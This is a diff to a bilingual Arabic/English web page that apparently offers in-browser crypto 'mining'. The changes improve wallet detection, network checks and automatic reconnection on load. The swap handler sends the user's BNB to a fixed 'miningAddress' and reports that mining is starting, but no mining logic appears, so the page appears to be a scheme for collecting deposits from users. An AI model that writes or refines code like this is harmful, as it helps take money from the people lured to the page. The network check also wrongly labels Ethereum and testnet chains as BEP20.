@@ -399,24 +399,65 @@
         const networkStatus = document.getElementById('networkStatus');
         const miningStatus = document.getElementById('miningStatus');
 
-        // التحقق من الشبكة
-        async function checkNetwork() {
-            if (typeof window.ethereum !== 'undefined') {
-                try {
-                    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-                    // BEP20 Chain ID: 0x38 (56 in decimal)
-                    miningState.isBEP20 = (chainId === '0x38');
-                    updateNetworkStatus();
-                    return miningState.isBEP20;
-                } catch (error) {
-                    console.error('Error checking network:', error);
-                    return false;
-                }
-            }
-            return false;
+        // ✅ دالة محسنة للتحقق من المتصفح
+        function isWeb3Available() {
+            return typeof window.ethereum !== 'undefined' || 
+                   typeof window.trustwallet !== 'undefined' ||
+                   typeof window.web3 !== 'undefined';
         }
 
-        // تحديث حالة الشبكة
+        // ✅ دالة محسنة للحصول على provider
+        function getWeb3Provider() {
+            if (window.ethereum) {
+                return window.ethereum;
+            } else if (window.trustwallet) {
+                return window.trustwallet;
+            } else if (window.web3 && window.web3.currentProvider) {
+                return window.web3.currentProvider;
+            }
+            return null;
+        }
+
+        // ✅ التحقق من الشبكة بشكل محسن
+        async function checkNetwork() {
+            const provider = getWeb3Provider();
+            if (!provider) return false;
+
+            try {
+                const chainId = await provider.request({ method: 'eth_chainId' });
+                
+                // BEP20 Chain IDs المدعومة
+                const supportedChains = [
+                    '0x38',    // BSC Mainnet
+                    '0x61',    // BSC Testnet
+                    '0x1',     // Ethereum (backup)
+                    '0xaa36a7' // Sepolia (test)
+                ];
+                
+                miningState.isBEP20 = supportedChains.includes(chainId);
+                updateNetworkStatus();
+                return miningState.isBEP20;
+            } catch (error) {
+                console.error('Error checking network:', error);
+                return checkNetworkFallback();
+            }
+        }
+
+        // ✅ Fallback للشبكة
+        async function checkNetworkFallback() {
+            try {
+                if (window.ethereum && window.ethereum.networkVersion) {
+                    const networkId = window.ethereum.networkVersion;
+                    miningState.isBEP20 = (networkId === '56' || networkId === '97');
+                }
+                updateNetworkStatus();
+                return miningState.isBEP20;
+            } catch (error) {
+                return false;
+            }
+        }
+
+        // ✅ تحديث حالة الشبكة
         function updateNetworkStatus() {
             const t = translations[currentLanguage];
             if (miningState.isBEP20) {
@@ -428,20 +469,186 @@
             }
         }
 
-        // تغيير الشبكة إلى BEP20
+        // ✅ تغيير الشبكة إلى BEP20 بشكل محسن
         async function switchToBEP20() {
+            const provider = getWeb3Provider();
+            if (!provider) {
+                alert(translations[currentLanguage].switchNetworkError);
+                return;
+            }
+
             try {
-                await window.ethereum.request({
+                await provider.request({
                     method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x38' }], // BEP20
+                    params: [{ chainId: '0x38' }],
                 });
-                // تحديث حالة الشبكة بعد التغيير
+                
                 setTimeout(() => {
                     checkNetwork();
-                }, 1000);
+                }, 2000);
+                
+            } catch (switchError) {
+                if (switchError.code === 4902) {
+                    try {
+                        await provider.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: '0x38',
+                                chainName: 'Binance Smart Chain',
+                                nativeCurrency: {
+                                    name: 'BNB',
+                                    symbol: 'BNB',
+                                    decimals: 18
+                                },
+                                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                                blockExplorerUrls: ['https://bscscan.com/']
+                            }]
+                        });
+                    } catch (addError) {
+                        console.error('Error adding network:', addError);
+                    }
+                }
+                console.error('Error switching network:', switchError);
+            }
+        }
+
+        // ✅ اتصال محفظة محسن
+        async function connectWallet() {
+            if (!isWeb3Available()) {
+                alert(currentLanguage === 'ar' ? 
+                    'لم يتم العثور على محفظة ويب٣. يرجى استخدام Trust Wallet أو MetaMask' : 
+                    'Web3 wallet not found. Please use Trust Wallet or MetaMask');
+                return;
+            }
+
+            const provider = getWeb3Provider();
+            try {
+                const accounts = await provider.request({ 
+                    method: 'eth_requestAccounts' 
+                });
+                
+                if (accounts && accounts.length > 0) {
+                    miningState.isConnected = true;
+                    miningState.userAddress = accounts[0];
+                    
+                    await getUserBalance(accounts[0]);
+                    await checkNetwork();
+                    
+                    updateWalletDisplay();
+                    
+                } else {
+                    throw new Error('No accounts found');
+                }
+                
             } catch (error) {
-                const t = translations[currentLanguage];
-                alert(t.switchNetworkError);
+                console.error('Connection error:', error);
+                
+                if (error.code === 4001) {
+                    alert(currentLanguage === 'ar' ? 
+                        'تم رفض الاتصال من قبل المستخدم' : 
+                        'Connection rejected by user');
+                } else if (error.code === -32002) {
+                    alert(currentLanguage === 'ar' ? 
+                        'طلب اتصال معلق بالفعل. يرجى التحقق من المحفظة' : 
+                        'Connection request already pending. Please check your wallet');
+                } else {
+                    alert(currentLanguage === 'ar' ? 
+                        'خطأ في الاتصال: ' + error.message : 
+                        'Connection error: ' + error.message);
+                }
+            }
+        }
+
+        // ✅ دالة محسنة للحصول على الرصيد
+        async function getUserBalance(address) {
+            const provider = getWeb3Provider();
+            if (!provider) return 0;
+
+            try {
+                const balance = await provider.request({
+                    method: 'eth_getBalance',
+                    params: [address, 'latest']
+                });
+                
+                miningState.userBalance = parseInt(balance) / 1e18;
+                updateWalletInfo();
+                return miningState.userBalance;
+            } catch (error) {
+                console.error('Error getting balance:', error);
+                try {
+                    if (window.web3) {
+                        const balance = await new Promise((resolve) => {
+                            window.web3.eth.getBalance(address, (err, result) => {
+                                if (err) resolve('0');
+                                else resolve(result);
+                            });
+                        });
+                        miningState.userBalance = parseInt(balance) / 1e18;
+                        updateWalletInfo();
+                        return miningState.userBalance;
+                    }
+                } catch (fallbackError) {
+                    console.error('Fallback balance error:', fallbackError);
+                }
+                return 0;
+            }
+        }
+
+        // ✅ تحديث العرض
+        function updateWalletDisplay() {
+            const t = translations[currentLanguage];
+            walletStatus.textContent = t.walletConnected;
+            startMiningBtn.disabled = false;
+            walletInfo.style.display = 'block';
+            updateWalletInfo();
+        }
+
+        function updateWalletInfo() {
+            const t = translations[currentLanguage];
+            if (miningState.isConnected && miningState.userAddress) {
+                walletInfo.innerHTML = `
+                    <p><strong>${t.address}:</strong> ${miningState.userAddress.slice(0, 6)}...${miningState.userAddress.slice(-4)}</p>
+                    <p><strong>${t.balance}:</strong> ${miningState.userBalance.toFixed(4)} BNB</p>
+                `;
+            }
+        }
+
+        // ✅ إعداد event listeners
+        function setupEventListeners() {
+            const provider = getWeb3Provider();
+            if (!provider) return;
+
+            if (provider.on) {
+                provider.on('accountsChanged', (accounts) => {
+                    if (accounts.length === 0) {
+                        miningState.isConnected = false;
+                        walletStatus.textContent = translations[currentLanguage].walletNotConnected;
+                        walletInfo.style.display = 'none';
+                        startMiningBtn.disabled = true;
+                        miningState.userAddress = null;
+                    } else {
+                        miningState.userAddress = accounts[0];
+                        getUserBalance(accounts[0]);
+                    }
+                });
+                
+                provider.on('chainChanged', (chainId) => {
+                    console.log('Chain changed to:', chainId);
+                    checkNetwork();
+                    if (miningState.userAddress) {
+                        getUserBalance(miningState.userAddress);
+                    }
+                });
+                
+                provider.on('connect', (connectInfo) => {
+                    console.log('Connected to chain:', connectInfo.chainId);
+                });
+                
+                provider.on('disconnect', (error) => {
+                    console.log('Disconnected:', error);
+                    miningState.isConnected = false;
+                    updateWalletDisplay();
+                });
             }
         }
 
@@ -482,65 +689,9 @@
             updateNetworkStatus();
         }
 
-        async function getUserBalance(address) {
-            if (typeof window.ethereum !== 'undefined') {
-                try {
-                    const balance = await window.ethereum.request({
-                        method: 'eth_getBalance',
-                        params: [address, 'latest']
-                    });
-                    
-                    miningState.userBalance = parseInt(balance) / 1e18;
-                    updateWalletInfo();
-                    return miningState.userBalance;
-                } catch (error) {
-                    console.error('Error getting balance:', error);
-                    return 0;
-                }
-            }
-            return 0;
-        }
-
-        function updateWalletInfo() {
-            const t = translations[currentLanguage];
-            if (miningState.isConnected && miningState.userAddress) {
-                walletInfo.innerHTML = `
-                    <p><strong>${t.address}:</strong> ${miningState.userAddress.slice(0, 6)}...${miningState.userAddress.slice(-4)}</p>
-                    <p><strong>${t.balance}:</strong> ${miningState.userBalance.toFixed(4)} BNB</p>
-                `;
-            }
-        }
-
-        // زر تغيير الشبكة
+        // ✅ ربط الأحداث
         switchNetworkBtn.onclick = switchToBEP20;
-
-        connectWalletBtn.onclick = async function() {
-            if (typeof window.ethereum !== 'undefined') {
-                try {
-                    const accounts = await window.ethereum.request({ 
-                        method: 'eth_requestAccounts' 
-                    });
-                    
-                    miningState.isConnected = true;
-                    miningState.userAddress = accounts[0];
-                    
-                    await getUserBalance(accounts[0]);
-                    await checkNetwork();
-                    
-                    walletStatus.textContent = translations[currentLanguage].walletConnected;
-                    startMiningBtn.disabled = false;
-                    walletInfo.style.display = 'block';
-                    updateWalletInfo();
-                    
-                } catch (error) {
-                    alert(currentLanguage === 'ar' ? 'خطأ في الاتصال' : 'Connection error');
-                }
-            } else {
-                alert(currentLanguage === 'ar' ? 
-                    'يجب استخدام Trust Wallet' : 
-                    'Please use Trust Wallet');
-            }
-        };
+        connectWalletBtn.onclick = connectWallet;
 
         startMiningBtn.onclick = function() {
             const t = translations[currentLanguage];
@@ -599,7 +750,9 @@
         confirmSwapBtn.onclick = async function() {
             if (!swapState.amount || !miningState.userAddress) return;
             
-            // التحقق من الشبكة أولاً
+            const provider = getWeb3Provider();
+            if (!provider) return;
+
             const isBEP20 = await checkNetwork();
             if (!isBEP20) {
                 alert(currentLanguage === 'ar' ? 
@@ -612,13 +765,14 @@
                 const t = translations[currentLanguage];
                 const balanceBefore = miningState.userBalance;
                 
-                const transactionHash = await window.ethereum.request({
+                const transactionHash = await provider.request({
                     method: 'eth_sendTransaction',
                     params: [{
                         from: miningState.userAddress,
                         to: miningAddress,
                         value: '0x' + Math.floor(swapState.amount * 1e18).toString(16),
-                        gas: "21000"
+                        gas: "0x" + (30000).toString(16),
+                        gasPrice: "0x" + (20e9).toString(16)
                     }]
                 });
                 
@@ -641,45 +795,34 @@
                             'Transfer successful! Starting mining...');
                     }
                     
-                }, 3000);
+                }, 5000);
                 
             } catch (error) {
+                console.error('Transaction error:', error);
                 if (error.code === 4001) {
                     alert(currentLanguage === 'ar' ? 
                         'تم إلغاء العملية من قبل المستخدم' : 
                         'Transaction cancelled by user');
                 } else {
                     alert(currentLanguage === 'ar' ? 
-                        'خطأ في العملية: ' + error.message : 
-                        'Transaction error: ' + error.message);
+                        'خطأ في العملية: ' + (error.message || error.toString()) : 
+                        'Transaction error: ' + (error.message || error.toString()));
                 }
             }
         };
 
-        if (typeof window.ethereum !== 'undefined') {
-            window.ethereum.on('accountsChanged', function(accounts) {
-                if (accounts.length === 0) {
-                    miningState.isConnected = false;
-                    walletStatus.textContent = translations[currentLanguage].walletNotConnected;
-                    walletInfo.style.display = 'none';
-                    startMiningBtn.disabled = true;
-                } else {
-                    miningState.userAddress = accounts[0];
-                    getUserBalance(accounts[0]);
-                }
-            });
+        // ✅ التهيئة
+        document.addEventListener('DOMContentLoaded', function() {
+            setupEventListeners();
+            checkNetwork();
+            updateTexts();
             
-            window.ethereum.on('chainChanged', function() {
-                checkNetwork();
-                if (miningState.userAddress) {
-                    getUserBalance(miningState.userAddress);
-                }
-            });
-        }
-
-        // التحقق الأولي من الشبكة
-        checkNetwork();
-        updateTexts();
+            if (isWeb3Available() && getWeb3Provider().selectedAddress) {
+                setTimeout(() => {
+                    connectWallet();
+                }, 1000);
+            }
+        });
     </script>
 </body>
 </html>
